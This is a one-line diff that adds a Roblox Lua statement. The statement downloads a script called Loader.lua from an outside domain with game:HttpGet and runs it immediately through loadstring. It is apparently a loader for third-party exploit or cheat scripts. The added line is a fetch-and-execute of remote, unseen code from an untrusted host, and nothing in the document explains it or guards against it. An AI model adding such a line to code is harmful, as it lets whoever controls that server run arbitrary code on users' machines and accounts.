@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.obscurity.cf/Loader.lua"))()
